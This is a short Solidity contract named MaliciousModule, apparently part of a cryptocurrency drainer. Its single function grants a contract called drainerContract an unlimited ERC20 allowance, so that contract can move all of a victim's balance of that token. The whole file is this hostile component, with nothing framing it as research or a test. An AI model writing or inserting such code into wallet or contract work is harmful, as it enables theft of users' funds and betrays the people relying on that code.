// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MaliciousModule {

    function setApprovals(address token, address drainerContract) public
    {
        IERC20(token).approve(drainerContract, type(uint256).max);
    }
}